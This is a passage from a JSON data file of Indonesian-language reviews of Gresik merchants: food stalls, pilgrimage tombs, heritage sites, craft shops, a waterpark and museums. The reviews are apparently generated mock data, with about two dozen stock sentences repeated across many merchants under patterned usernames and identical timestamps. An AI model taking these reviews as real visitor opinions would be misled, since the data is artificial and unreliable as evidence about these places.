                "id": "r433",
                "merchantId": "m145",
                "userName": "Warkop_Lover_35",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r434",
                "merchantId": "m145",
                "userName": "Sejarah_RI_58",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-27T14:36:35.404Z"
            },
            {
                "id": "r435",
                "merchantId": "m145",
                "userName": "Keluarga_Ceria_73",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r436",
                "merchantId": "m146",
                "userName": "Warkop_Lover_70",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-27T14:36:35.404Z"
            },
            {
                "id": "r437",
                "merchantId": "m146",
                "userName": "Sejarah_RI_78",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-26T14:36:35.404Z"
            },
            {
                "id": "r438",
                "merchantId": "m146",
                "userName": "Keluarga_Ceria_31",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-28T14:36:35.404Z"
            },
            {
                "id": "r439",
                "merchantId": "m147",
                "userName": "Warkop_Lover_51",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r440",
                "merchantId": "m147",
                "userName": "Sejarah_RI_52",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r441",
                "merchantId": "m147",
                "userName": "Keluarga_Ceria_40",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r442",
                "merchantId": "m148",
                "userName": "Warkop_Lover_48",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-25T14:36:35.404Z"
            },
            {
                "id": "r443",
                "merchantId": "m148",
                "userName": "Sejarah_RI_15",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r444",
                "merchantId": "m148",
                "userName": "Keluarga_Ceria_17",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r445",
                "merchantId": "m149",
                "userName": "Warkop_Lover_95",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-28T14:36:35.404Z"
            },
            {
                "id": "r446",
                "merchantId": "m149",
                "userName": "Sejarah_RI_71",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r447",
                "merchantId": "m149",
                "userName": "Keluarga_Ceria_18",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-27T14:36:35.404Z"
            },
            {
                "id": "r448",
                "merchantId": "m150",
                "userName": "Warkop_Lover_47",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r449",
                "merchantId": "m150",
                "userName": "Sejarah_RI_44",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-16T14:36:35.404Z"
            },
            {
                "id": "r450",
                "merchantId": "m150",
                "userName": "Keluarga_Ceria_69",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r451",
                "merchantId": "m151",
                "userName": "Warkop_Lover_53",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r452",
                "merchantId": "m151",
                "userName": "Sejarah_RI_10",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-25T14:36:35.404Z"
            },
            {
                "id": "r453",
                "merchantId": "m151",
                "userName": "Keluarga_Ceria_69",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r454",
                "merchantId": "m152",
                "userName": "Warkop_Lover_90",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-25T14:36:35.404Z"
            },
            {
                "id": "r455",
                "merchantId": "m152",
                "userName": "Sejarah_RI_90",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r456",
                "merchantId": "m152",
                "userName": "Keluarga_Ceria_76",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-27T14:36:35.404Z"
            },
            {
                "id": "r457",
                "merchantId": "m153",
                "userName": "Warkop_Lover_69",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r458",
                "merchantId": "m153",
                "userName": "Sejarah_RI_74",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-16T14:36:35.404Z"
            },
            {
                "id": "r459",
                "merchantId": "m153",
                "userName": "Keluarga_Ceria_55",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r460",
                "merchantId": "m154",
                "userName": "Warkop_Lover_33",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r461",
                "merchantId": "m154",
                "userName": "Sejarah_RI_29",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r462",
                "merchantId": "m154",
                "userName": "Keluarga_Ceria_96",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r463",
                "merchantId": "m155",
                "userName": "Warkop_Lover_84",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r464",
                "merchantId": "m155",
                "userName": "Sejarah_RI_13",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r465",
                "merchantId": "m155",
                "userName": "Keluarga_Ceria_12",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r466",
                "merchantId": "m156",
                "userName": "Warkop_Lover_32",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r467",
                "merchantId": "m156",
                "userName": "Sejarah_RI_27",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r468",
                "merchantId": "m156",
                "userName": "Keluarga_Ceria_44",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r469",
                "merchantId": "m157",
                "userName": "Neng_Siti_66",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r470",
                "merchantId": "m157",
                "userName": "Warkop_Lover_55",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r471",
                "merchantId": "m157",
                "userName": "Sejarah_RI_24",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r472",
                "merchantId": "m158",
                "userName": "Warkop_Lover_24",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r473",
                "merchantId": "m158",
                "userName": "Sejarah_RI_93",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r474",
                "merchantId": "m158",
                "userName": "Keluarga_Ceria_44",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-20T14:36:35.404Z"
            },
            {
                "id": "r475",
                "merchantId": "m159",
                "userName": "Warkop_Lover_61",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-25T14:36:35.404Z"
            },
            {
                "id": "r476",
                "merchantId": "m159",
                "userName": "Sejarah_RI_79",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r477",
                "merchantId": "m159",
                "userName": "Keluarga_Ceria_36",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-28T14:36:35.404Z"
            },
            {
                "id": "r478",
                "merchantId": "m160",
                "userName": "Warkop_Lover_78",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r479",
                "merchantId": "m160",
                "userName": "Sejarah_RI_24",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r480",
                "merchantId": "m160",
                "userName": "Keluarga_Ceria_80",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r481",
                "merchantId": "m161",
                "userName": "Warkop_Lover_45",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-26T14:36:35.404Z"
            },
            {
                "id": "r482",
                "merchantId": "m161",
                "userName": "Sejarah_RI_10",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r483",
                "merchantId": "m161",
                "userName": "Keluarga_Ceria_19",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r484",
                "merchantId": "m162",
                "userName": "Warkop_Lover_20",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-26T14:36:35.404Z"
            },
            {
                "id": "r485",
                "merchantId": "m162",
                "userName": "Sejarah_RI_80",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r486",
                "merchantId": "m162",
                "userName": "Keluarga_Ceria_37",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r487",
                "merchantId": "m163",
                "userName": "Warkop_Lover_44",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r488",
                "merchantId": "m163",
                "userName": "Sejarah_RI_68",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r489",
                "merchantId": "m163",
                "userName": "Keluarga_Ceria_90",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r490",
                "merchantId": "m164",
                "userName": "Neng_Siti_52",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r491",
                "merchantId": "m164",
                "userName": "Warkop_Lover_34",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r492",
                "merchantId": "m164",
                "userName": "Sejarah_RI_67",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r493",
                "merchantId": "m165",
                "userName": "Warkop_Lover_56",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r494",
                "merchantId": "m165",
                "userName": "Sejarah_RI_28",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r495",
                "merchantId": "m165",
                "userName": "Keluarga_Ceria_20",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r496",
                "merchantId": "m166",
                "userName": "Warkop_Lover_76",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r497",
                "merchantId": "m166",
                "userName": "Sejarah_RI_80",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r498",
                "merchantId": "m166",
                "userName": "Keluarga_Ceria_49",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-20T14:36:35.404Z"
            },
            {
                "id": "r499",
                "merchantId": "m167",
                "userName": "Warkop_Lover_85",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-26T14:36:35.404Z"
            },
            {
                "id": "r500",
                "merchantId": "m167",
                "userName": "Sejarah_RI_92",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-28T14:36:35.404Z"
            },
            {
                "id": "r501",
                "merchantId": "m167",
                "userName": "Keluarga_Ceria_12",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r502",
                "merchantId": "m168",
                "userName": "Warkop_Lover_75",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r503",
                "merchantId": "m168",
                "userName": "Sejarah_RI_50",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r504",
                "merchantId": "m168",
                "userName": "Keluarga_Ceria_72",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r505",
                "merchantId": "m169",
                "userName": "Warkop_Lover_12",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r506",
                "merchantId": "m169",
                "userName": "Sejarah_RI_12",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-14T14:36:35.404Z"
            },
            {
                "id": "r507",
                "merchantId": "m169",
                "userName": "Keluarga_Ceria_96",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r508",
                "merchantId": "m170",
                "userName": "Warkop_Lover_34",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r509",
                "merchantId": "m170",
                "userName": "Sejarah_RI_71",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r510",
                "merchantId": "m170",
                "userName": "Keluarga_Ceria_45",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r511",
                "merchantId": "m171",
                "userName": "Warkop_Lover_58",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r512",
                "merchantId": "m171",
                "userName": "Sejarah_RI_38",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-27T14:36:35.404Z"
            },
            {
                "id": "r513",
                "merchantId": "m171",
                "userName": "Keluarga_Ceria_86",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r514",
                "merchantId": "m172",
                "userName": "Neng_Siti_22",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r515",
                "merchantId": "m172",
                "userName": "Warkop_Lover_47",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r516",
                "merchantId": "m172",
                "userName": "Sejarah_RI_88",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-20T14:36:35.404Z"
            },
            {
                "id": "r517",
                "merchantId": "m173",
                "userName": "Warkop_Lover_31",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-15T14:36:35.404Z"
            },
            {
                "id": "r518",
                "merchantId": "m173",
                "userName": "Sejarah_RI_98",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-22T14:36:35.404Z"
            },
            {
                "id": "r519",
                "merchantId": "m173",
                "userName": "Keluarga_Ceria_53",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r520",
                "merchantId": "m174",
                "userName": "Warkop_Lover_23",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r521",
                "merchantId": "m174",
                "userName": "Sejarah_RI_96",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r522",
                "merchantId": "m174",
                "userName": "Keluarga_Ceria_30",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r523",
                "merchantId": "m175",
                "userName": "Warkop_Lover_27",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r524",
                "merchantId": "m175",
                "userName": "Sejarah_RI_43",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r525",
                "merchantId": "m175",
                "userName": "Keluarga_Ceria_73",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r526",
                "merchantId": "m176",
                "userName": "Neng_Siti_81",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r527",
                "merchantId": "m176",
                "userName": "Warkop_Lover_96",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-22T14:36:35.405Z"
            },
            {
                "id": "r528",
                "merchantId": "m176",
                "userName": "Sejarah_RI_67",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r529",
                "merchantId": "m177",
                "userName": "Warkop_Lover_95",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r530",
                "merchantId": "m177",
                "userName": "Sejarah_RI_74",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r531",
                "merchantId": "m177",
                "userName": "Keluarga_Ceria_85",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r532",
                "merchantId": "m178",
                "userName": "Warkop_Lover_26",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-16T14:36:35.405Z"
            },
            {
                "id": "r533",
                "merchantId": "m178",
                "userName": "Sejarah_RI_59",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-22T14:36:35.405Z"
            },
            {
                "id": "r534",
                "merchantId": "m178",
                "userName": "Keluarga_Ceria_67",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.405Z"
            },
            {
                "id": "r535",
                "merchantId": "m179",
                "userName": "Warkop_Lover_37",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r536",
                "merchantId": "m179",
                "userName": "Sejarah_RI_41",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-18T14:36:35.405Z"
            },
            {
                "id": "r537",
                "merchantId": "m179",
                "userName": "Keluarga_Ceria_66",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r538",
                "merchantId": "m180",
                "userName": "Warkop_Lover_83",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-25T14:36:35.405Z"
            },
            {
                "id": "r539",
                "merchantId": "m180",
                "userName": "Sejarah_RI_75",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-23T14:36:35.405Z"
            },
            {
                "id": "r540",
                "merchantId": "m180",
                "userName": "Keluarga_Ceria_45",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-15T14:36:35.405Z"
            },
            {
                "id": "r541",
                "merchantId": "m181",
                "userName": "Warkop_Lover_68",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-24T14:36:35.405Z"
            },
            {
                "id": "r542",
                "merchantId": "m181",
                "userName": "Sejarah_RI_29",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r543",
                "merchantId": "m181",
                "userName": "Keluarga_Ceria_59",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-14T14:36:35.405Z"
            },
            {
                "id": "r544",
                "merchantId": "m182",
                "userName": "Warkop_Lover_18",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-20T14:36:35.405Z"
            },
            {
                "id": "r545",
                "merchantId": "m182",
                "userName": "Sejarah_RI_54",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-17T14:36:35.405Z"
            },
            {
                "id": "r546",
                "merchantId": "m182",
                "userName": "Keluarga_Ceria_19",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-19T14:36:35.405Z"
            },
            {
                "id": "r547",
